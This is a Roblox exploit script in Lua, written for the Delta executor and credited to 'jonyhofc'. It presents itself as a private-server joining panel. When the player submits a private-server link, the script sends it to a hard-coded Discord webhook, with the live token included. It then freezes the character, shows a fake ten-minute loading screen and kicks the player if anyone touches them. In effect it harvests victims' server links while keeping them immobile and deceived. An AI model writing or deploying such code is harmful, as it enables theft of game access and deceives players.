--[[ 
    SCRIPT DELTA - Painel jonyhofc (com kick ao toque e congelamento)
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- URL do Webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1460716542542221506/3CTeRm6Nm_4d3qvcQLsoYxt-kT7RFE2t6Zz5q9nmamiMKybMD3XY4_DmbJDmsrA0qasn"
local TEMPO_TOTAL = 600 -- 10 minutos

-- ========== NOVAS VARIÁVEIS ==========
local congelado = false
local personagem = nil
local conexaoToque = nil

print("[DELTA] Script iniciado! Carregando painel...")

-- =============================================
-- FUNÇÃO PARA ENVIAR AO DISCORD (VIA DELTA)
-- =============================================
local function enviarLink(link)
    local dados = {
        content = "🔗 Link do servidor privado (Delta): " .. link
    }
    local json = HttpService:JSONEncode(dados)

    local sucesso, erro = pcall(function()
        if http and http.request then
            http.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        elseif syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
        end
    end)

    if sucesso then
        print("[WEBHOOK] Link enviado com sucesso!")
    else
        warn("[WEBHOOK] Falha ao enviar: " .. tostring(erro))
    end
end

-- =============================================
-- CRIAÇÃO DO PAINEL (USANDO COREGUI)
-- =============================================
local function criarPainel()
    local guiParent = game:GetService("CoreGui")
    if not guiParent then
        guiParent = LocalPlayer.PlayerGui
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PainelDelta"
    screenGui.Parent = guiParent

    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 450, 0, 300)
    panel.Position = UDim2.new(0.5, -225, 0.5, -150)
    panel.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    panel.BackgroundTransparency = 0.1
    panel.BorderSizePixel = 0
    panel.Active = true
    panel.Draggable = true
    panel.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = panel

    local titulo = Instance.new("TextLabel")
    titulo.Size = UDim2.new(1, 0, 0, 55)
    titulo.Position = UDim2.new(0, 0, 0, 0)
    titulo.BackgroundTransparency = 1
    titulo.Text = "Feito pelo jonyhofc"
    titulo.TextColor3 = Color3.fromRGB(255, 200, 0)
    titulo.TextScaled = true
    titulo.Font = Enum.Font.GothamBold
    titulo.Parent = panel

    local caixaTexto = Instance.new("TextBox")
    caixaTexto.Size = UDim2.new(0.8, 0, 0, 50)
    caixaTexto.Position = UDim2.new(0.1, 0, 0.35, 0)
    caixaTexto.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    caixaTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
    caixaTexto.PlaceholderText = "Cole o link do servidor aqui"
    caixaTexto.Text = ""
    caixaTexto.Font = Enum.Font.Gotham
    caixaTexto.TextSize = 20
    caixaTexto.ClearTextOnFocus = false
    caixaTexto.Parent = panel

    local botao = Instance.new("TextButton")
    botao.Size = UDim2.new(0.5, 0, 0, 55)
    botao.Position = UDim2.new(0.25, 0, 0.7, 0)
    botao.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
    botao.TextColor3 = Color3.fromRGB(255, 255, 255)
    botao.Text = "🚀 Entrar"
    botao.Font = Enum.Font.GothamBold
    botao.TextSize = 28
    botao.Parent = panel

    print("[PAINEL] Painel criado na CoreGui com sucesso!")
    return screenGui, caixaTexto, botao
end

-- =============================================
-- TELA PRETA COM BARRA DE PROGRESSO
-- =============================================
local function telaCarregamento()
    local guiParent = game:GetService("CoreGui")
    if not guiParent then
        guiParent = LocalPlayer.PlayerGui
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "LoadingDelta"
    gui.Parent = guiParent

    local fundo = Instance.new("Frame")
    fundo.Size = UDim2.new(1, 0, 1, 0)
    fundo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    fundo.BorderSizePixel = 0
    fundo.Parent = gui

    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, 600, 0, 200)
    container.Position = UDim2.new(0.5, -300, 0.5, -100)
    container.BackgroundTransparency = 1
    container.Parent = fundo

    local texto = Instance.new("TextLabel")
    texto.Size = UDim2.new(1, 0, 0, 50)
    texto.BackgroundTransparency = 1
    texto.Text = "Conectando ao servidor privado..."
    texto.TextColor3 = Color3.fromRGB(255, 255, 255)
    texto.TextScaled = true
    texto.Font = Enum.Font.GothamBold
    texto.Parent = container

    local bgBarra = Instance.new("Frame")
    bgBarra.Size = UDim2.new(1, 0, 0, 35)
    bgBarra.Position = UDim2.new(0, 0, 0.4, 0)
    bgBarra.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    bgBarra.BorderSizePixel = 0
    bgBarra.Parent = container

    local barra = Instance.new("Frame")
    barra.Size = UDim2.new(0, 0, 1, 0)
    barra.BackgroundColor3 = Color3.fromRGB(0, 220, 100)
    barra.BorderSizePixel = 0
    barra.Parent = bgBarra

    local pct = Instance.new("TextLabel")
    pct.Size = UDim2.new(1, 0, 1, 0)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
    pct.TextScaled = true
    pct.Font = Enum.Font.Gotham
    pct.Parent = bgBarra

    local tempo = Instance.new("TextLabel")
    tempo.Size = UDim2.new(1, 0, 0, 50)
    tempo.Position = UDim2.new(0, 0, 0.75, 0)
    tempo.BackgroundTransparency = 1
    tempo.Text = "00:00:000"
    tempo.TextColor3 = Color3.fromRGB(200, 200, 210)
    tempo.TextScaled = true
    tempo.Font = Enum.Font.Gotham
    tempo.Parent = container

    return gui, barra, pct, tempo
end

-- =============================================
-- NOVA FUNÇÃO: CONGELAR JOGADOR
-- =============================================
local function congelarJogador()
    congelado = true
    local char = LocalPlayer.Character
    if char then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            -- Impede rotação também
            hrp.Anchored = true
        end
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            -- Impede que o jogador saia do lugar mesmo se tentar
            hum.PlatformStand = true
        end
        -- Desativa colisão com outros? Não, para não atrapalhar o kick.
    end
    print("[CONGELAR] Jogador congelado!")
end

-- =============================================
-- NOVA FUNÇÃO: REAPLICAR CONGELAMENTO APÓS RESPAWN
-- =============================================
local function aplicarCongelamentoRespawn()
    if congelado then
        -- Aguarda o novo personagem carregar
        local char = LocalPlayer.Character
        if not char then
            char = LocalPlayer.CharacterAdded:Wait()
        end
        -- Pequeno delay para o Humanoid carregar
        task.wait(0.5)
        congelarJogador()
        -- Reconecta o evento de toque para o novo personagem
        if conexaoToque then
            conexaoToque:Disconnect()
            conexaoToque = nil
        end
        ativarDetectorToque()
    end
end

-- =============================================
-- NOVA FUNÇÃO: DETECTOR DE TOQUE (KICK)
-- =============================================
local function ativarDetectorToque()
    local char = LocalPlayer.Character
    if not char then return end

    -- Remove conexão antiga se existir
    if conexaoToque then
        conexaoToque:Disconnect()
        conexaoToque = nil
    end

    -- Para cada parte do personagem, adiciona um detector de toque
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            local conn = part.Touched:Connect(function(otherPart)
                if not otherPart then return end
                local otherChar = otherPart:FindFirstAncestorOfClass("Model")
                if otherChar and otherChar ~= char then
                    -- Verifica se o outro é um jogador
                    local otherPlayer = Players:GetPlayerFromCharacter(otherChar)
                    if otherPlayer and otherPlayer ~= LocalPlayer then
                        print("[KICK] Jogador " .. otherPlayer.Name .. " encostou! Aplicando kick...")
                        -- Aplica kick (desconecta o jogador)
                        LocalPlayer:Kick("Você foi tocado por " .. otherPlayer.Name .. "!")
                    end
                end
            end)
            -- Armazena a conexão para poder desconectar depois
            if not conexaoToque then
                conexaoToque = conn
            end
        end
    end
end

-- =============================================
-- SCRIPT PRINCIPAL
-- =============================================
local function main()
    -- Aguarda o jogador carregar
    repeat task.wait() until LocalPlayer and LocalPlayer.Character

    -- ===== ATIVA DETECTOR DE TOQUE INICIAL =====
    ativarDetectorToque()

    -- ===== CONECTA O EVENTO DE RESPAWN =====
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.3)
        aplicarCongelamentoRespawn()
        ativarDetectorToque() -- reativa o detector no novo corpo
    end)

    -- ===== CRIA O PAINEL =====
    local screenGui, caixaTexto, botao = criarPainel()

    local ocupado = false

    botao.MouseButton1Click:Connect(function()
        if ocupado then return end

        local link = caixaTexto.Text
        link = link:gsub("^%s+", ""):gsub("%s+$", "")

        if link == "" then
            caixaTexto.PlaceholderText = "⚠️ Coloque o link!"
            task.wait(1.5)
            caixaTexto.PlaceholderText = "Cole o link do servidor aqui"
            return
        end

        ocupado = true
        print("[BOTÃO] Link capturado: " .. link)

        -- 1. Envia webhook
        enviarLink(link)

        -- 2. CONGELA O JOGADOR (AGORA!)
        congelarJogador()

        -- 3. Fecha o painel
        screenGui:Destroy()

        -- 4. Abre a tela preta
        local loadGui, barra, pct, tempo = telaCarregamento()

        -- 5. Cronômetro
        local inicio = tick()
        local decorrido = 0

        local conexao
        conexao = RunService.Heartbeat:Connect(function(delta)
            decorrido = decorrido + delta

            if decorrido >= TEMPO_TOTAL then
                decorrido = TEMPO_TOTAL
                conexao:Disconnect()
                loadGui:Destroy()

                -- Tela de conclusão
                local finalGui = Instance.new("ScreenGui")
                finalGui.Parent = game:GetService("CoreGui")
                local f = Instance.new("Frame")
                f.Size = UDim2.new(1, 0, 1, 0)
                f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                f.Parent = finalGui
                local lbl = Instance.new("TextLabel")
                lbl.Size = UDim2.new(1, 0, 1, 0)
                lbl.BackgroundTransparency = 1
                lbl.Text = "✅ Servidor carregado!"
                lbl.TextColor3 = Color3.fromRGB(0, 255, 100)
                lbl.TextScaled = true
                lbl.Font = Enum.Font.GothamBold
                lbl.Parent = f
                task.wait(3)
                finalGui:Destroy()
                return
            end

            local progresso = decorrido / TEMPO_TOTAL
            local percentual = math.floor(progresso * 100)
            barra.Size = UDim2.new(progresso, 0, 1, 0)
            pct.Text = tostring(percentual) .. "%"

            local restante = TEMPO_TOTAL - decorrido
            local min = math.floor(restante / 60)
            local seg = math.floor(restante % 60)
            local mil = math.floor((restante - math.floor(restante)) * 1000)
            tempo.Text = string.format("%02d:%02d:%03d", min, seg, mil)
        end)
    end)
end

-- ===== EXECUÇÃO GARANTIDA =====
local ok, err = pcall(main)
if not ok then
    warn("[ERRO] " .. tostring(err))
    print("Tente novamente. Se persistir, verifique se o Delta está atualizado.")
else
    print("[SUCESSO] Script rodando perfeitamente!")
end
